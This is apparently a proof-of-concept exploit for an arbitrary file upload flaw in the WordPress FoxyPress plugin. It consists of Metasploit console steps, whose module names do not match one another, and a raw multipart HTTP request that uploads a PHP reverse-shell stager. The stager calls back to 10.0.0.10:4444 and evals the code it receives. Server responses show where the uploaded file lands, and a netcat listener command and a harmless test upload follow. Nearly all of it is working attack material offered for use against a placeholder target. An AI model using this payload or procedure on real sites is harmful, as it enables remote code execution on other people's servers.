[PoC metesploit]

	Exploit :
 
		msf > use exploit/unix/webapp/wp_foxypress_upload
	    msf exploit(wp_wptouch_file_upload) > show targets
	        ...targets...
	    msf exploit(wp_wptouch_file_upload) > set TARGET <target-id>
	    msf exploit(wp_wptouch_file_upload) > show options
	        ...show and set options...

	    msf exploit(wp_wptouch_file_upload) > set RHOST <HOST>
	    msf exploit(wp_wptouch_file_upload) > set RPORT <PORT>

	    msf exploit(wp_wptouch_file_upload) > exploit


[HTTP REQUEST]
	POST /wp-content/plugins/foxypress/uploadify/uploadify.php HTTP/1.1
	Host: {TARGET}
	User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
	Content-Type: multipart/form-data; boundary=_Part_141_522986818_1045801173
	Content-Length: 1305

	--_Part_141_522986818_1045801173
	Content-Disposition: form-data; name="Filedata"; filename="T8qDVA.php"
	Content-Type: application/octet-stream

	<?php /*<?php /**/ error_reporting(0); $ip = '10.0.0.10'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die(); ?>
	--_Part_141_522986818_1045801173--

[HTTP RESPONSE]
	HTTP/1.1 200 OK
	Date: Thu, 23 Aug 2018 10:54:24 GMT
	Server: Apache/2.4.7 (Ubuntu)
	X-Powered-By: PHP/5.5.9-1ubuntu4.25
	Set-Cookie: PHPSESSID=6td2eeofllnrilfk633v56r2c2; path=/
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
	Pragma: no-cache
	Vary: Accept-Encoding
	Content-Length: 304
	Content-Type: text/html

	{"raw_file_name":"907a831cdecffd2310ba3c853316e1ba","file_name":"907a831cdecffd2310ba3c853316e1ba.php","real_name":"T8qDVA.php","file_ext":".php","file_size":1.09,"file_path":"\/var\/www\/html\/wordpress\/wp-content\/affiliate_images\/907a831cdecffd2310ba3c853316e1ba.php","file_temp":"\/tmp\/phptsymBm"}

#### nc -lvvp 4444

[POC UPLOAD]
	[HTTP REQUEST]
		POST /wp-content/plugins/foxypress/uploadify/uploadify.php HTTP/1.1
		Host: {TARGET}
		User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
		Content-Type: multipart/form-data; boundary=_Part_141_522986818_1045801173
		Content-Length: 212

		--_Part_141_522986818_1045801173
		Content-Disposition: form-data; name="Filedata"; filename="error.php"
		Content-Type: application/octet-stream

		<?php echo "VT-2018-00423";?>
		--_Part_141_522986818_1045801173--
	[HTTP RESPONSE]
		HTTP/1.1 200 OK
		Date: Tue, 04 Sep 2018 06:44:28 GMT
		Server: Apache/2.4.25 (Debian)
		X-Powered-By: PHP/7.2.9
		Set-Cookie: PHPSESSID=16f1da66d4b1d11dbaa64bfff648a525; path=/
		Expires: Thu, 19 Nov 1981 08:52:00 GMT
		Cache-Control: no-store, no-cache, must-revalidate
		Pragma: no-cache
		Vary: Accept-Encoding
		Content-Length: 292
		Content-Type: text/html; charset=UTF-8

		{"raw_file_name":"5d1229d0941951a292ceddcb1b3dc261","file_name":"5d1229d0941951a292ceddcb1b3dc261.php","real_name":"error.php","file_ext":".php","file_size":0.03,"file_path":"\/var\/www\/html\/wp-content\/affiliate_images\/5d1229d0941951a292ceddcb1b3dc261.php","file_temp":"\/tmp\/phpVRfQd0"}


